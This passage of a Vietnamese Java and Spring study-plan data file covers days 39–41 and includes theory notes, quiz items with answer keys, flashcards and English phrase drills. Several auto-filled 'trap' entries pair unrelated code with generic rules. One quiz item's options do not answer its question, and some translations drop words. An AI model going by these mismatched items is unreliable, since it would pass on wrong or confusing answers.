      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### 1. IoC (Inversion of Control) & DI (Dependency Injection)\n- **IoC (Đảo ngược điều khiển):** Thay vì code tự `new` đối tượng, quyền tạo và quản lý vòng đời đối tượng được giao cho Spring Container.\n- **DI (Tiêm phụ thuộc):** Spring Container tự động tiêm đối tượng phụ thuộc vào class thông qua:\n  1. Constructor Injection (Được khuyến nghị nhất).\n  2. Setter Injection.\n  3. Field Injection (`@Autowired` trên biến).\n\n### 2. Spring Stereotypes\n- `@Component`: Đánh dấu class là Spring Bean nói chung.\n- `@Service`: Đánh dấu lớp Business Logic.\n- `@Repository`: Đánh dấu lớp DAO truy xuất dữ liệu, tự chuyển đổi exception SQL.\n- `@Controller` / `@RestController`: Đánh dấu Web Controller.\n\n### 3. Bean Scopes\n- `singleton` (Mặc định): Duy nhất 1 instance trong toàn bộ Container.\n- `prototype`: Mỗi lần gọi `getBean()` hoặc inject sẽ tạo một instance mới.\n",
          "code": "@Service\npublic class UserService {\n    private final UserDAO userDAO;\n    \n    @Autowired // Constructor Injection\n    public UserService(UserDAO userDAO) {\n        this.userDAO = userDAO;\n    }\n}"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d39_1",
          "level": "Medium",
          "question": "Trong Spring Framework, Scope mặc định của một Bean là gì và có ý nghĩa gì?",
          "code": "@Component\npublic class UserService {\n    // Scope mặc định là gì?\n}",
          "options": [
            "singleton (chỉ tạo duy nhất 1 instance trong toàn bộ Spring IoC Container)",
            "prototype (tạo instance mới mỗi lần được inject)",
            "request (mỗi HTTP request 1 instance)",
            "session (mỗi user session 1 instance)"
          ],
          "correctIndex": 0,
          "explanation": "Trong Spring, scope mặc định của mọi Bean là `singleton`. Spring Container chỉ khởi tạo duy nhất một thể hiện của class đó và tái sử dụng (chia sẻ) ở tất cả các vị trí được tiêm phụ thuộc (@Autowired)."
        }
      ],
      "examTraps": [
        {
          "trap": "Sử dụng Field Injection (@Autowired trên private field) gây khó khăn khi viết Unit Test",
          "whyPeopleWrong": "Thấy ngắn gọn nên lạm dụng @Autowired trên mọi private field.",
          "wrongThinking": "Nghĩ rằng tiện là tốt nhất.",
          "correctRule": "Field Injection làm class phụ thuộc chặt vào Spring container. Khi viết Unit Test JUnit thuần, không thể new Service() và truyền mock repository vào được vì biến private null. Hãy chuyển sang Constructor Injection!",
          "code": "// Tránh:\n// @Autowired private UserRepo repo;\n// Khuyến nghị:\nprivate final UserRepo repo;\npublic UserService(UserRepo repo) { this.repo = repo; }",
          "miniCheck": "Ưu tiên dùng Constructor Injection kết hợp Lombok @RequiredArgsConstructor."
        },
        {
          "trap": "Cạm bẫy 1: Constructor Injection an toàn hơn Field Injection vì hỗ trợ immutability (final) và dễ viết Unit Test.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "@Service\npublic class UserService {\n    private final UserDAO userDAO;\n    \n    @Autowired // Constructor Injection\n    public UserService(UserDAO userDAO) {\n        this.userDAO = userDAO;\n    }\n}",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        },
        {
          "trap": "Cạm bẫy 2: Bean singleton có trạng thái thay đổi dễ gặp lỗi race-condition đa luồng.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "@Service\npublic class UserService {\n    private final UserDAO userDAO;\n    \n    @Autowired // Constructor Injection\n    public UserService(UserDAO userDAO) {\n        this.userDAO = userDAO;\n    }\n}",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Nguyên lý IoC và DI",
          "questions": [
            {
              "q": "Inversion of Control (IoC) và Dependency Injection (DI) trong Spring Framework là gì?",
              "ans": "IoC là nguyên lý đảo ngược quyền kiểm soát vòng đời và khởi tạo đối tượng từ lập trình viên sang framework (Spring Container). DI là mẫu thiết kế cụ thể thực hiện IoC: Container sẽ 'tiêm' (inject) các phụ thuộc cần thiết vào đối tượng thông qua constructor, setter, hoặc field."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Các Bean Scopes trong Spring",
          "questions": [
            {
              "q": "Phân biệt hai scope phổ biến nhất của Spring Bean: `singleton` và `prototype`.",
              "ans": "`singleton` (mặc định): Spring Container chỉ tạo duy nhất một thể hiện của Bean trong toàn bộ vòng đời ứng dụng. `prototype`: Mỗi lần gọi `getBean()` hoặc có yêu cầu tiêm phụ thuộc, Spring Container sẽ tạo một thể hiện hoàn toàn mới."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace Constructor Injection với Spring",
          "questions": [
            {
              "q": "Cho đoạn code sau trong Spring Boot:\n```java\n@Service\npublic class OrderService {\n    private final PaymentService paymentService;\n    public OrderService(PaymentService paymentService) {\n        this.paymentService = paymentService;\n    }\n}\n```\nTại sao không cần viết annotation `@Autowired` trên constructor mà Spring vẫn tự tiêm được bean?",
              "ans": "Từ Spring 4.3 trở đi, nếu một Spring Bean chỉ có DUY NHẤT một constructor thì Spring sẽ ngầm định coi constructor đó được đánh dấu `@Autowired` và tự động tiêm các dependencies vào tham số mà không cần khai báo tường minh."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy Circular Dependency (Phụ thuộc vòng tròn)",
          "questions": [
            {
              "q": "Khi `ClassA` yêu cầu tiêm `ClassB` qua constructor và `ClassB` cũng yêu cầu tiêm `ClassA` qua constructor, Spring Boot khi khởi động sẽ báo lỗi gì?",
              "ans": "Ném ngoại lệ `BeanCurrentlyInCreationException: Requested bean is currently in creation: Is there an unresolvable circular reference?` làm sập ứng dụng."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Vòng đời Spring Bean Lifecycle",
          "questions": [
            {
              "q": "Kể tên thứ tự các bước trong vòng đời của Spring Bean: `@PostConstruct`, Constructor, Setter Injection.",
              "ans": "1) Constructor -> 2) Setter/Field Dependency Injection -> 3) `@PostConstruct` method."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_39_1",
          "q": "Trong Spring Framework, hình thức Dependency Injection nào được Spring Team khuyến nghị sử dụng số 1?",
          "options": [
            "Constructor Injection",
            "Field Injection",
            "Setter Injection",
            "Interface Injection"
          ],
          "correct": 0,
          "exp": "Constructor Injection đảm bảo các thuộc tính có thể đặt là final (bất biến), kiểm tra phụ thuộc bắt buộc ngay lúc compile/khởi tạo, và cực kỳ dễ viết Unit Test độc lập."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Khái niệm Inversion of Control (IoC) và Dependency Injection (DI) trong Spring?",
          "a": "- IoC (Đảo ngược điều khiển): Chuyển giao quyền khởi tạo, cấu hình và quản lý vòng đời của đối tượng từ code thủ công sang cho Spring Framework (IoC Container).\n- DI (Tiêm phụ thuộc): Cơ chế mà Spring Container tự động đưa (inject) các bean phụ thuộc vào đối tượng thông qua Constructor, Setter hoặc Field.",
          "trap": "Khuyến nghị dùng Constructor Injection để code dễ unit test và đảm bảo tính bất biến (immutable)."
        }
      ],
      "dailyEnglish": [
        {
          "id": 36,
          "vi": "Câu truy vấn sql không thực hiện được",
          "en": "SQL  statement can not be executed"
        },
        {
          "id": 37,
          "vi": "Lấy danh sách theo điều kiện gán",
          "en": "Get list by assigning condition"
        },
        {
          "id": 38,
          "vi": "Set giá trị cho biến từ danh sách được lấy từ db",
          "en": "Assign values to variabes from list in database"
        },
        {
          "id": 39,
          "vi": "Kiểm tra nêu dữ liệu lấy là là rỗng thì sẽ export hết tất cả danh sách, ngược lại thì sẽ export theo dữ liệu được lấy về",
          "en": "Check if taken data is null, export all list, else, export by data"
        },
        {
          "id": 40,
          "vi": "Lấy dữ liệu về và kiểm tra nếu loại là C thì sẽ vào cập nhật và nếu là D thì sẽ là xóa, còn lại sẽ báo lỗi",
          "en": "if value of ... is D, delete, else C, update"
        }
      ],
      "chapter": "Spring Framework: IoC, DI & Bean Lifecycle"
    },
    "40": {
      "day": 40,
      "week": 6,
      "title": "Spring MVC & Spring Boot Basics",
      "topics": [
        "Spring MVC Flow: DispatcherServlet -> HandlerMapping -> Controller -> ViewResolver",
        "@RequestMapping, @GetMapping, @PostMapping",
        "@PathVariable vs @RequestParam vs @RequestBody",
        "Spring Boot: Starter dependencies, auto-configuration, application.properties"
      ],
      "tasks": [
        "Vẽ luồng xử lý request trong Spring MVC",
        "Luyện tập trả lời các câu hỏi Audit về Spring"
      ],
      "englishDrill": [
        {
          "id": 39,
          "vi": "Kiểm tra nêu dữ liệu lấy là là rỗng thì sẽ export hết tất cả danh sách, ngược lại thì sẽ export theo dữ liệu được lấy về",
          "en": "Check if taken data is null, export all list, else, export by data"
        },
        {
          "id": 40,
          "vi": "Lấy dữ liệu về và kiểm tra nếu loại là C thì sẽ vào cập nhật và nếu là D thì sẽ là xóa, còn lại sẽ báo lỗi",
          "en": "if value of ... is D, delete, else C, update"
        },
        {
          "id": 41,
          "vi": "Lấy dữ liệu của mảng đối tượng khi submit từ jsp lên form",
          "en": "Get data of object classes when submitting from jsp into form"
        },
        {
          "id": 42,
          "vi": "Thực hiện lấy dữ liệu combobox theo các giá trị được lấy phía trước",
          "en": "Get data of combobox by values taken before"
        },
        {
          "id": 43,
          "vi": "- Hàm kiểm tra 1 đối tượng có tồn tại ít nhát 1 thuộc tính rỗng",
          "en": "Function of checking 1 object which exists at least 1 property"
        }
      ],
      "summary": "Spring MVC Flow & Spring Boot Basics (Annotations: @RestController, @PathVariable, @RequestBody).",
      "coreTheory": "\n### 1. Luồng xử lý Spring MVC (Spring MVC Architecture)\n1. Browser gửi request $\\rightarrow$ `DispatcherServlet` (Front Controller) tiếp nhận.\n2. `DispatcherServlet` hỏi `HandlerMapping` để tìm Controller tương ứng.\n3. Controller thực thi logic nghiệp vụ và trả về `ModelAndView` hoặc dữ liệu JSON.\n4. `ViewResolver` phân giải view template (JSP/Thymeleaf) $\\rightarrow$ Trả HTML về trình duyệt.\n\n### 2. Các Annotations phổ biến trong REST API\n- `@RestController` = `@Controller` + `@ResponseBody` (trả về dữ liệu JSON trực tiếp).\n- `@GetMapping`, `@PostMapping`, `@PutMapping`, `@DeleteMapping`.\n- `@PathVariable`: Lấy tham số trên đường dẫn URL (ví dụ `/users/{id}`).\n- `@RequestParam`: Lấy query parameter (ví dụ `?page=1&size=10`).\n- `@RequestBody`: Tự động chuyển đổi chuỗi JSON gửi lên thành Java Object (DTO).\n",
      "codeSnippet": "@RestController\n@RequestMapping(\"/api/users\")\npublic class UserController {\n    @GetMapping(\"/{id}\")\n    public User getUserById(@PathVariable(\"id\") Long id) {\n        return userService.findById(id);\n    }\n}",
      "traps": [
        "Dùng @Controller thông thường nếu muốn trả về JSON phải gắn thêm @ResponseBody.",
        "@RequestBody chỉ dùng cho phương thức POST/PUT có mang Body dữ liệu."
      ],
      "quickQuiz": [
        {
          "q": "DispatcherServlet đóng vai trò gì trong Spring MVC?",
          "a": "Front Controller tiếp nhận mọi request đầu vào."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟡 MEDIUM (FEE & Audit Practice)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Spring MVC Flow: DispatcherServlet -> HandlerMapping -> Controller -> ViewResolver, @RequestMapping, @GetMapping, @PostMapping, @PathVariable vs @RequestParam vs @RequestBody.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### 1. Luồng xử lý Spring MVC (Spring MVC Architecture)\n1. Browser gửi request $\\rightarrow$ `DispatcherServlet` (Front Controller) tiếp nhận.\n2. `DispatcherServlet` hỏi `HandlerMapping` để tìm Controller tương ứng.\n3. Controller thực thi logic nghiệp vụ và trả về `ModelAndView` hoặc dữ liệu JSON.\n4. `ViewResolver` phân giải view template (JSP/Thymeleaf) $\\rightarrow$ Trả HTML về trình duyệt.\n\n### 2. Các Annotations phổ biến trong REST API\n- `@RestController` = `@Controller` + `@ResponseBody` (trả về dữ liệu JSON trực tiếp).\n- `@GetMapping`, `@PostMapping`, `@PutMapping`, `@DeleteMapping`.\n- `@PathVariable`: Lấy tham số trên đường dẫn URL (ví dụ `/users/{id}`).\n- `@RequestParam`: Lấy query parameter (ví dụ `?page=1&size=10`).\n- `@RequestBody`: Tự động chuyển đổi chuỗi JSON gửi lên thành Java Object (DTO).\n",
          "code": "@RestController\n@RequestMapping(\"/api/users\")\npublic class UserController {\n    @GetMapping(\"/{id}\")\n    public User getUserById(@PathVariable(\"id\") Long id) {\n        return userService.findById(id);\n    }\n}"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_40_1",
          "level": "Easy",
          "question": "DispatcherServlet đóng vai trò gì trong Spring MVC?",
          "code": "@RestController\n@RequestMapping(\"/api/users\")\npublic class UserController {\n    @GetMapping(\"/{id}\")\n    public User getUserById(@PathVariable(\"id\") Long id) {\n        return userService.findById(id);\n    }\n}",
          "options": [
            "Đúng theo dự đoán",
            "Compile Error",
            "Runtime Exception",
            "Khác"
          ],
          "correctIndex": 0,
          "explanation": "Front Controller tiếp nhận mọi request đầu vào."
        }
      ],
      "examTraps": [
        {
          "trap": "Dùng @Controller thông thường cho REST API mà quên @ResponseBody",
          "whyPeopleWrong": "Viết method trả về đối tượng List<User> với @Controller.",
          "wrongThinking": "Tưởng rằng Spring sẽ tự đoán trả về JSON.",
          "correctRule": "Với @Controller thông thường, String trả về được hiểu là tên file View (JSP/HTML). Nếu muốn trả về dữ liệu JSON, bắt buộc phải có @ResponseBody hoặc dùng trực tiếp @RestController!",
          "code": "@RestController // Tự động có @ResponseBody cho toàn bộ method\npublic class ApiController { ... }",
          "miniCheck": "Viết API RESTful thì luôn dùng @RestController."
        },
        {
          "trap": "Cạm bẫy 1: Dùng @Controller thông thường nếu muốn trả về JSON phải gắn thêm @ResponseBody.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "@RestController\n@RequestMapping(\"/api/users\")\npublic class UserController {\n    @GetMapping(\"/{id}\")\n    public User getUserById(@PathVariable(\"id\") Long id) {\n        return userService.findById(id);\n    }\n}",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        },
        {
          "trap": "Cạm bẫy 2: @RequestBody chỉ dùng cho phương thức POST/PUT có mang Body dữ liệu.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "@RestController\n@RequestMapping(\"/api/users\")\npublic class UserController {\n    @GetMapping(\"/{id}\")\n    public User getUserById(@PathVariable(\"id\") Long id) {\n        return userService.findById(id);\n    }\n}",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Kiến trúc Spring MVC",
          "questions": [
            {
              "q": "Thành phần nào đóng vai trò là Front Controller tiếp nhận mọi request đầu vào trong Spring MVC?",
              "ans": "`DispatcherServlet`."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "ViewResolver và luồng xử lý request",
          "questions": [
            {
              "q": "Nêu vai trò của `ViewResolver` trong kiến trúc Spring MVC truyền thống.",
              "ans": "Nhận chuỗi logic view name trả về từ Controller (ví dụ \"home\"), kết hợp với prefix và suffix để xác định file hiển thị vật lý (ví dụ `/WEB-INF/views/home.jsp`) và chuyển giao dữ liệu Model vào đó."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace @RequestParam vs @PathVariable",
          "questions": [
            {
              "q": "Cho endpoint:\n```java\n@GetMapping(\"/users/{id}\")\npublic String getUser(@PathVariable(\"id\") int id, @RequestParam(\"detail\") boolean detail) { ... }\n```\nRequest URL nào sau đây là hợp lệ: `/users/5?detail=true` hay `/users?id=5&detail=true`?",
              "ans": "URL hợp lệ là `/users/5?detail=true`. Giá trị `5` được trích xuất từ URI path (`@PathVariable`), còn `detail=true` được trích xuất từ query parameter (`@RequestParam`)."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy @RestController vs @Controller",
          "questions": [
            {
              "q": "Sự khác biệt giữa `@RestController` và `@Controller` là gì?",
              "ans": "`@RestController` là tổ hợp của `@Controller` và `@ResponseBody`. Mọi phương thức trong `@RestController` mặc định serialize dữ liệu trực tiếp thành JSON/XML trả về cho client thay vì tìm kiếm view template."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "ControllerAdvice và Global Exception Handling",
          "questions": [
            {
              "q": "Annotation nào được sử dụng để bắt và xử lý ngoại lệ tập trung cho toàn bộ các Controller trong ứng dụng Spring?",
              "ans": "`@RestControllerAdvice` (hoặc `@ControllerAdvice`) kết hợp với các phương thức được đánh dấu `@ExceptionHandler`."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_40_1",
          "q": "Chú thích @RestController trong Spring Boot là sự kết hợp của 2 chú thích nào?",
          "options": [
            "@Controller và @ResponseBody",
            "@Controller và @Component",
            "@Service và @ResponseBody",
            "@Configuration và @Controller"
          ],
          "correct": 0,
          "exp": "@RestController = @Controller + @ResponseBody. Mọi phương thức trong RestController mặc định tự động serialize đối tượng trả về thành chuỗi JSON trong HTTP Response Body."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Các thành phần chính tham gia xử lý Request trong mô hình Spring MVC?",
          "a": "1. `DispatcherServlet`: Tiếp nhận HTTP request.\n2. `HandlerMapping`: Tìm Controller phù hợp.\n3. `Controller`: Xử lý nghiệp vụ và trả về Model & ViewName.\n4. `ViewResolver`: Phân giải ViewName thành trang giao diện HTML/JSP thực tế.",
          "trap": "Với RESTful API, dùng `@RestController` để bỏ qua ViewResolver và trả thẳng JSON ra body."
        }
      ],
      "dailyEnglish": [
        {
          "id": 39,
          "vi": "Kiểm tra nêu dữ liệu lấy là là rỗng thì sẽ export hết tất cả danh sách, ngược lại thì sẽ export theo dữ liệu được lấy về",
          "en": "Check if taken data is null, export all list, else, export by data"
        },
        {
          "id": 40,
          "vi": "Lấy dữ liệu về và kiểm tra nếu loại là C thì sẽ vào cập nhật và nếu là D thì sẽ là xóa, còn lại sẽ báo lỗi",
          "en": "if value of ... is D, delete, else C, update"
        },
        {
          "id": 41,
          "vi": "Lấy dữ liệu của mảng đối tượng khi submit từ jsp lên form",
          "en": "Get data of object classes when submitting from jsp into form"
        },
        {
          "id": 42,
          "vi": "Thực hiện lấy dữ liệu combobox theo các giá trị được lấy phía trước",
          "en": "Get data of combobox by values taken before"
        },
        {
          "id": 43,
          "vi": "- Hàm kiểm tra 1 đối tượng có tồn tại ít nhát 1 thuộc tính rỗng",
          "en": "Function of checking 1 object which exists at least 1 property"
        }
      ],
      "chapter": "Spring MVC & Spring Boot Basics"
    },
    "41": {
      "day": 41,
      "week": 6,
      "title": "Bổ sung Java 8-17 Features (OCA/OCP Alignment)",
      "topics": [
        "Java 8: Lambda expressions, Functional Interfaces (@FunctionalInterface), Stream API (filter, map, collect), Optional class",
        "Interface default & static methods",
        "Java 11: var keyword (local-variable type inference)",
        "Java 17: Record classes, Sealed classes cơ bản"
      ],
      "tasks": [
        "Viết ví dụ Stream API tính tổng hoặc lọc danh sách",
        "Làm 15 câu trắc nghiệm Java 8"
      ],
      "englishDrill": [
        {
          "id": 42,
          "vi": "Thực hiện lấy dữ liệu combobox theo các giá trị được lấy phía trước",
          "en": "Get data of combobox by values taken before"
        },
        {
          "id": 43,
          "vi": "- Hàm kiểm tra 1 đối tượng có tồn tại ít nhát 1 thuộc tính rỗng",
          "en": "Function of checking 1 object which exists at least 1 property"
        },
        {
          "id": 44,
          "vi": "Xử lý sự kiện khi người dùng click vào button XXX",
          "en": "Process event when user clicks button XXX"
        },
        {
          "id": 45,
          "vi": "- Chuyển đổi biến A có kiểu dữ liệu  BBB  sang biến C có kiểu dữ liệu DDD",
          "en": "Convert variable A with BBB data type to variable C with DDD data type"
        },
        {
          "id": 46,
          "vi": "Lấy ra đối tượng với tham số truyền vào",
          "en": "Get objects with inputted parameter"
        }
      ],
      "summary": "Bổ sung Java 8-17 Features: Lambda, Functional Interface, Stream API, Optional, var, Records.",
      "coreTheory": "\n### 1. Java 8 Cốt Lõi\n- **Lambda Expression:** Cú pháp ngắn gọn `(params) -> expression`.\n- **Functional Interface:** Interface chỉ có DUY NHẤT 1 abstract method (`@FunctionalInterface`), ví dụ: `Predicate`, `Consumer`, `Function`, `Supplier`.\n- **Stream API:** Xử lý tập hợp dạng luồng dữ liệu: `filter()`, `map()`, `sorted()`, `collect()`, `reduce()`.\n- **Optional:** Bao bọc giá trị để hạn chế lỗi `NullPointerException`.\n- **Interface Default Method:** Cho phép viết thân hàm `default` trong interface từ Java 8.\n\n### 2. Java 11 & Java 17\n- `var`: Khai báo biến cục bộ suy luận kiểu tự động (Java 10+).\n- `record`: Class bất biến lưu dữ liệu ngắn gọn, tự sinh getter/equals/hashCode/toString (Java 16+).\n",
      "codeSnippet": "List<String> names = List.of(\"An\", \"Binh\", \"Cuong\");\nList<String> filtered = names.stream()\n    .filter(name -> name.startsWith(\"A\"))\n    .map(String::toUpperCase)\n    .collect(Collectors.toList());\n\nrecord Student(int id, String name) {} // Record Java 17",
      "traps": [
        "Stream sau khi đã gọi Terminal Operation (như collect, count) thì không thể tái sử dụng lại.",
        "var chỉ dùng được cho biến cục bộ (local variable), không dùng cho thuộc tính class hay tham số method."
      ],
      "quickQuiz": [
        {
          "q": "Functional Interface có bao nhiêu abstract method?",
          "a": "Chính xác 1 abstract method."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟡 MEDIUM (FEE & Audit Practice)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Java 8: Lambda expressions, Functional Interfaces (@FunctionalInterface), Stream API (filter, map, collect), Optional class, Interface default & static methods, Java 11: var keyword (local-variable type inference).",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### 1. Java 8 Cốt Lõi\n- **Lambda Expression:** Cú pháp ngắn gọn `(params) -> expression`.\n- **Functional Interface:** Interface chỉ có DUY NHẤT 1 abstract method (`@FunctionalInterface`), ví dụ: `Predicate`, `Consumer`, `Function`, `Supplier`.\n- **Stream API:** Xử lý tập hợp dạng luồng dữ liệu: `filter()`, `map()`, `sorted()`, `collect()`, `reduce()`.\n- **Optional:** Bao bọc giá trị để hạn chế lỗi `NullPointerException`.\n- **Interface Default Method:** Cho phép viết thân hàm `default` trong interface từ Java 8.\n\n### 2. Java 11 & Java 17\n- `var`: Khai báo biến cục bộ suy luận kiểu tự động (Java 10+).\n- `record`: Class bất biến lưu dữ liệu ngắn gọn, tự sinh getter/equals/hashCode/toString (Java 16+).\n",
          "code": "List<String> names = List.of(\"An\", \"Binh\", \"Cuong\");\nList<String> filtered = names.stream()\n    .filter(name -> name.startsWith(\"A\"))\n    .map(String::toUpperCase)\n    .collect(Collectors.toList());\n\nrecord Student(int id, String name) {} // Record Java 17"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d41_1",
          "level": "Medium",
          "question": "Biểu thức Stream API sau của Java 8 in ra kết quả gì?",
          "code": "import java.util.*;\nimport java.util.stream.*;\npublic class StreamTrace {\n    public static void main(String[] args) {\n        List<String> list = Arrays.asList(\"apple\", \"banana\", \"avocado\", \"cherry\");\n        long count = list.stream()\n                         .filter(s -> s.startsWith(\"a\"))\n                         .count();\n        System.out.println(count);\n    }\n}",
          "options": [
            "2",
            "3",
            "1",
            "Compile Error"
          ],
          "correctIndex": 0,
          "explanation": "Phương thức `filter()` lọc các chuỗi bắt đầu bằng chữ 'a', bao gồm 'apple' và 'avocado' (tổng cộng 2 phần tử). Phương thức kết thúc (terminal operation) `.count()` đếm số phần tử thỏa mãn điều kiện và trả về `2`."
        }
      ],
      "examTraps": [
        {
          "trap": "Cố gắng tái sử dụng (Re-use) một dòng Stream đã đóng",
          "whyPeopleWrong": "Gán Stream s = list.stream(); rồi gọi s.count(); sau đó lại gọi s.collect();.",
          "wrongThinking": "Tưởng rằng Stream có thể duyệt nhiều lần như Collection.",
          "correctRule": "Stream chỉ có thể duyệt duy nhất 1 lần. Một khi Terminal Operation đã chạy, Stream bị đóng vĩnh viễn. Nếu gọi tiếp sẽ bị ném ngoại lệ java.lang.IllegalStateException: stream has already been operated upon or closed!",
          "code": "Stream<String> s = list.stream();\ns.forEach(System.out::println);\n// s.count(); // RUNTIME ERROR: IllegalStateException!",
          "miniCheck": "Stream chỉ duyệt 1 lần duy nhất, muốn duyệt lại phải gọi list.stream() mới."
        },
        {
          "trap": "Cạm bẫy 1: Stream sau khi đã gọi Terminal Operation (như collect, count) thì không thể tái sử dụng lại.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "List<String> names = List.of(\"An\", \"Binh\", \"Cuong\");\nList<String> filtered = names.stream()\n    .filter(name -> name.startsWith(\"A\"))\n    .map(String::toUpperCase)\n    .collect(Collectors.toList());\n\nrecord Student(int id, String name) {} // Record Java 17",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        },
        {
          "trap": "Cạm bẫy 2: var chỉ dùng được cho biến cục bộ (local variable), không dùng cho thuộc tính class hay tham số method.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "List<String> names = List.of(\"An\", \"Binh\", \"Cuong\");\nList<String> filtered = names.stream()\n    .filter(name -> name.startsWith(\"A\"))\n    .map(String::toUpperCase)\n    .collect(Collectors.toList());\n\nrecord Student(int id, String name) {} // Record Java 17",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Functional Interface trong Java 8",
          "questions": [
            {
              "q": "Định nghĩa chuẩn của một Functional Interface là gì?",
              "ans": "Là một interface chứa CHÍNH XÁC DUY NHẤT một abstract method (Single Abstract Method - SAM). Có thể chứa thêm bất kỳ số lượng default methods hoặc static methods nào."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Cú pháp Method Reference",
          "questions": [
            {
              "q": "Biểu thức lambda `s -> System.out.println(s)` tương đương với Method Reference nào?",
              "ans": "Tương đương: `System.out::println`."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace Predicate chaining",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nPredicate<Integer> isEven = n -> n % 2 == 0;\nPredicate<Integer> isPositive = n -> n > 0;\nboolean res = isEven.and(isPositive).test(-4);\nSystem.out.println(res);\n```\nKết quả in ra là gì?",
